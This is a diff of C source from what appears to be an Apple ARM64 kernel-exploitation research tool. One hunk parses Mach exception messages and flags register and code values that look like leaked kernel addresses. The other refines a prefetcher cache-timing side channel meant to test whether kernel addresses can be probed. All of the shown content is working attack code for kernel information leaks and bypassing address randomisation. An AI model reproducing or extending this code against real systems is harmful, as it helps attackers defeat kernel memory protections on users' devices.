@@ -16632,23 +16632,107 @@ static void r420_probe(void) {
                     rlog("      msgh_remote_port=0x%x msgh_local_port=0x%x\n",
                         msg.hdr.msgh_remote_port, msg.hdr.msgh_local_port);
 
-                    /* Dump the entire message body looking for kernel addrs */
-                    rlog("    Raw exception message body (first 512 bytes):\n");
-                    uint64_t *bodyPtr = (uint64_t *)msg.body;
-                    int bodyWords = (msg.hdr.msgh_size > sizeof(msg.hdr)) ?
-                        (msg.hdr.msgh_size - sizeof(msg.hdr)) / 8 : 0;
-                    if (bodyWords > 64) bodyWords = 64;
+                    /* Parse the exception message structure properly.
+                       msgh_id=2407 = mach_exception_raise_state_identity
+                       Body layout (after mach_msg_body_t):
+                         mach_msg_port_descriptor_t thread_port
+                         mach_msg_port_descriptor_t task_port
+                         NDR_record_t NDR
+                         exception_type_t exception (int32)
+                         mach_msg_type_number_t codeCnt
+                         int64_t code[codeCnt]  (MACH_EXCEPTION_CODES)
+                         int flavor
+                         mach_msg_type_number_t stateCnt
+                         natural_t state[stateCnt]
+                    */
+                    uint8_t *bp = msg.body;
+                    int blen = msg.hdr.msgh_size - sizeof(msg.hdr);
 
-                    for (int i = 0; i < bodyWords; i++) {
-                        uint64_t v = bodyPtr[i];
-                        rlog("      +%03d: 0x%016llx", i * 8,
-                            (unsigned long long)v);
+                    /* mach_msg_body_t: 4 bytes descriptor count */
+                    uint32_t descCnt = *(uint32_t *)bp;
+                    rlog("    descriptor count: %u\n", descCnt);
+                    bp += 4;
+
+                    /* Skip port descriptors (12 bytes each) */
+                    for (uint32_t d = 0; d < descCnt && d < 4; d++) {
+                        uint32_t pname = *(uint32_t *)bp;
+                        rlog("    descriptor[%u]: port=0x%x\n", d, pname);
+                        bp += 12;
+                    }
+
+                    /* NDR record (8 bytes) */
+                    bp += 8;
+
+                    /* exception_type (4 bytes) */
+                    int32_t excType = *(int32_t *)bp;
+                    bp += 4;
+                    rlog("    exception_type: %d\n", excType);
+
+                    /* codeCnt (4 bytes) */
+                    uint32_t codeCnt = *(uint32_t *)bp;
+                    bp += 4;
+                    rlog("    codeCnt: %u\n", codeCnt);
+
+                    /* codes (8 bytes each with MACH_EXCEPTION_CODES) */
+                    for (uint32_t c = 0; c < codeCnt && c < 4; c++) {
+                        uint64_t code;
+                        memcpy(&code, bp, 8);
+                        rlog("    code[%u]: 0x%016llx", c,
+                            (unsigned long long)code);
+                        if ((code >> 32) >= 0xFFFFFFF0ULL &&
+                            code != 0xFFFFFFFFFFFFFFFF)
+                            rlog(" *** KERNEL ***");
+                        rlog("\n");
+                        bp += 8;
+                    }
+
+                    /* flavor (4 bytes) */
+                    int32_t flavor = *(int32_t *)bp;
+                    bp += 4;
+                    rlog("    thread state flavor: %d\n", flavor);
+
+                    /* stateCnt (4 bytes) */
+                    uint32_t stateCnt = *(uint32_t *)bp;
+                    bp += 4;
+                    rlog("    stateCnt: %u\n", stateCnt);
+
+                    /* Dump state words - these are ARM64 thread state */
+                    rlog("    Thread state from exception:\n");
+                    int stateBytes = stateCnt * 4;
+                    if (stateBytes > blen - (int)(bp - msg.body))
+                        stateBytes = blen - (int)(bp - msg.body);
+                    /* ARM_THREAD_STATE64 has x0-x28, fp, lr, sp, pc, cpsr */
+                    int nregs = stateBytes / 8;
+                    for (int r = 0; r < nregs && r < 34; r++) {
+                        uint64_t rv;
+                        memcpy(&rv, bp + r * 8, 8);
+                        const char *names[] = {
+                            "x0","x1","x2","x3","x4","x5","x6","x7",
+                            "x8","x9","x10","x11","x12","x13","x14","x15",
+                            "x16","x17","x18","x19","x20","x21","x22","x23",
+                            "x24","x25","x26","x27","x28","fp","lr","sp",
+                            "pc","cpsr"
+                        };
+                        rlog("      %-4s = 0x%016llx",
+                            r < 34 ? names[r] : "???",
+                            (unsigned long long)rv);
+                        if ((rv >> 32) >= 0xFFFFFFF0ULL &&
+                            rv != 0xFFFFFFFFFFFFFFFF)
+                            rlog(" *** KERNEL ***");
+                        rlog("\n");
+                    }
+
+                    /* Also dump raw body for anything we missed */
+                    rlog("    Raw body hex dump:\n");
+                    uint64_t *rawBody = (uint64_t *)msg.body;
+                    int rawWords = (msg.hdr.msgh_size - sizeof(msg.hdr)) / 8;
+                    if (rawWords > 48) rawWords = 48;
+                    for (int i = 0; i < rawWords; i++) {
+                        uint64_t v = rawBody[i];
                         if ((v >> 32) >= 0xFFFFFFF0ULL &&
                             v != 0xFFFFFFFFFFFFFFFF)
-                            rlog(" *** KERNEL ***");
-                        if (v == 0xDEAD000)
-                            rlog(" (fault addr)");
-                        rlog("\n");
+                            rlog("      +%03d: 0x%016llx *** KERNEL ***\n",
+                                i * 8, (unsigned long long)v);
                     }
 
                     /* Send a reply to unblock the faulting thread
@@ -16793,115 +16877,133 @@ static void r420_probe(void) {
     }
     fflush(stdout);
 
-    /* ---- Vector 4: DMP cache timing probe ---- */
+    /* ---- Vector 4: DMP cache timing probe (mach_absolute_time) ---- */
     rlog("\n  Vector 4: DMP cache timing baseline\n");
     {
-        /* Measure baseline cache access timing using CNTPCT_EL0 */
-        /* First establish timing resolution */
+        /* Use mach_absolute_time() for nanosecond-level precision */
         uint64_t t0, t1;
-        __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
-        __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
-        rlog("    Timer resolution: %llu ticks back-to-back\n",
+        t0 = mach_absolute_time();
+        t1 = mach_absolute_time();
+        rlog("    Timer resolution: %llu MAT ticks\n",
             (unsigned long long)(t1 - t0));
 
-        /* Allocate probe buffer */
-        void *probe = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
+        /* Get timebase info */
+        mach_timebase_info_data_t tbinfo;
+        mach_timebase_info(&tbinfo);
+        rlog("    Timebase: numer=%u denom=%u\n",
+            tbinfo.numer, tbinfo.denom);
+
+        /* Allocate probe buffer - 4MB, page-aligned */
+        size_t probeSize = 1024 * 4096;
+        void *probe = mmap(NULL, probeSize, PROT_READ | PROT_WRITE,
             MAP_ANON | MAP_PRIVATE, -1, 0);
         if (probe != MAP_FAILED) {
-            /* Write candidate kernel addresses into an IOSurface backing
-               store. The DMP will treat values in memory as pointers
-               and prefetch from them. If a kernel virtual address is
-               valid (and the DMP can reach it), the cache line at
-               that address becomes hot. We detect this by measuring
-               access to a known mapping at similar cache set. */
-
-            /* First: measure cache hit vs miss timing */
+            /* Measure cache hit timing (1000 iterations) */
             volatile uint64_t *p = (volatile uint64_t *)probe;
-            /* Warm the line */
             *p = 42;
             uint64_t warm_total = 0;
-            for (int i = 0; i < 100; i++) {
-                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+            for (int i = 0; i < 1000; i++) {
+                t0 = mach_absolute_time();
                 volatile uint64_t v = *p;
                 (void)v;
-                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+                t1 = mach_absolute_time();
                 warm_total += (t1 - t0);
             }
-            rlog("    Cache hit avg: %llu ticks\n",
-                (unsigned long long)(warm_total / 100));
+            rlog("    Cache hit avg: %llu MAT (~%llu ns)\n",
+                (unsigned long long)(warm_total / 1000),
+                (unsigned long long)(warm_total * tbinfo.numer /
+                    (1000ULL * tbinfo.denom)));
 
-            /* Flush and measure cold */
+            /* Measure cache miss timing */
             uint64_t cold_total = 0;
             for (int i = 0; i < 100; i++) {
-                /* Evict by touching many other cache lines */
-                for (int j = 1; j < 256; j++) {
+                /* Evict by touching 512 other cache lines */
+                for (int j = 1; j < 512; j++) {
                     volatile uint64_t *q = (volatile uint64_t *)
-                        ((uint8_t*)probe + j * 4096);
+                        ((uint8_t*)probe + (j % 1024) * 4096);
                     *q = j;
                 }
-                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+                __asm__ volatile("dsb sy" ::: "memory");
+                __asm__ volatile("isb" ::: "memory");
+                t0 = mach_absolute_time();
                 volatile uint64_t v = *p;
                 (void)v;
-                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+                t1 = mach_absolute_time();
                 cold_total += (t1 - t0);
             }
-            rlog("    Cache miss avg: %llu ticks\n",
-                (unsigned long long)(cold_total / 100));
+            rlog("    Cache miss avg: %llu MAT (~%llu ns)\n",
+                (unsigned long long)(cold_total / 100),
+                (unsigned long long)(cold_total * tbinfo.numer /
+                    (100ULL * tbinfo.denom)));
 
-            uint64_t threshold = (warm_total + cold_total) / 200;
-            rlog("    Threshold: %llu ticks\n",
+            uint64_t hitAvg = warm_total / 1000;
+            uint64_t missAvg = cold_total / 100;
+            uint64_t threshold = (hitAvg + missAvg) / 2;
+            rlog("    Threshold: %llu MAT\n",
                 (unsigned long long)threshold);
 
-            /* Now test DMP behavior: write pointer-like values and
-               see if the DMP prefetches them */
-            /* Write a known valid address (our own buffer) */
+            /* DMP test: write valid pointer, check if target prefetched */
             volatile uint64_t *src = (volatile uint64_t *)
-                ((uint8_t*)probe + 128 * 4096);
+                ((uint8_t*)probe + 512 * 4096);
             volatile uint64_t *target = (volatile uint64_t *)
-                ((uint8_t*)probe + 200 * 4096);
+                ((uint8_t*)probe + 800 * 4096);
 
-            /* Evict target */
-            for (int j = 0; j < 128; j++) {
-                volatile uint64_t *q = (volatile uint64_t *)
-                    ((uint8_t*)probe + j * 4096);
-                *q = j;
+            /* Test with valid address */
+            int valid_hits = 0, invalid_hits = 0;
+            for (int trial = 0; trial < 20; trial++) {
+                /* Evict target */
+                for (int j = 0; j < 512; j++) {
+                    volatile uint64_t *q = (volatile uint64_t *)
+                        ((uint8_t*)probe + (j % 1024) * 4096);
+                    *q = j;
+                }
+                __asm__ volatile("dsb sy" ::: "memory");
+
+                /* Write target's address into src */
+                *src = (uint64_t)target;
+                __asm__ volatile("dsb sy" ::: "memory");
+
+                /* Delay for DMP to act */
+                for (volatile int d = 0; d < 100000; d++);
+
+                /* Measure target access */
+                t0 = mach_absolute_time();
+                volatile uint64_t v = *target;
+                (void)v;
+                t1 = mach_absolute_time();
+                if ((t1 - t0) <= threshold) valid_hits++;
+            }
+            rlog("    DMP valid ptr: %d/20 hits\n", valid_hits);
+
+            /* Test with invalid address */
+            for (int trial = 0; trial < 20; trial++) {
+                for (int j = 0; j < 512; j++) {
+                    volatile uint64_t *q = (volatile uint64_t *)
+                        ((uint8_t*)probe + (j % 1024) * 4096);
+                    *q = j;
+                }
+                __asm__ volatile("dsb sy" ::: "memory");
+
+                *src = 0xDEADBEEFDEAD0000ULL;
+                __asm__ volatile("dsb sy" ::: "memory");
+
+                for (volatile int d = 0; d < 100000; d++);
+
+                t0 = mach_absolute_time();
+                volatile uint64_t v = *target;
+                (void)v;
+                t1 = mach_absolute_time();
+                if ((t1 - t0) <= threshold) invalid_hits++;
+            }
+            rlog("    DMP invalid ptr: %d/20 hits\n", invalid_hits);
+
+            if (valid_hits > invalid_hits + 5) {
+                rlog("    *** DMP ACTIVE - can probe kernel addresses! ***\n");
+            } else {
+                rlog("    DMP not distinguishable or mitigated\n");
             }
 
-            /* Write target's address into src (DMP should prefetch) */
-            *src = (uint64_t)target;
-            __asm__ volatile("dsb sy" ::: "memory");
-
-            /* Small delay for DMP to act */
-            for (volatile int d = 0; d < 10000; d++);
-
-            /* Measure target access time */
-            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
-            volatile uint64_t v = *target;
-            (void)v;
-            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
-            rlog("    DMP test (valid ptr): %llu ticks %s\n",
-                (unsigned long long)(t1 - t0),
-                (t1 - t0) < threshold ? "HIT" : "MISS");
-
-            /* Test with invalid address (should not prefetch) */
-            for (int j = 0; j < 128; j++) {
-                volatile uint64_t *q = (volatile uint64_t *)
-                    ((uint8_t*)probe + j * 4096);
-                *q = j;
-            }
-            *src = 0xDEADBEEFDEAD0000ULL; /* invalid */
-            __asm__ volatile("dsb sy" ::: "memory");
-            for (volatile int d = 0; d < 10000; d++);
-
-            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
-            v = *target;
-            (void)v;
-            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
-            rlog("    DMP test (invalid ptr): %llu ticks %s\n",
-                (unsigned long long)(t1 - t0),
-                (t1 - t0) < threshold ? "HIT" : "MISS");
-
-            munmap(probe, 256 * 4096);
+            munmap(probe, probeSize);
         }
     }
     fflush(stdout);
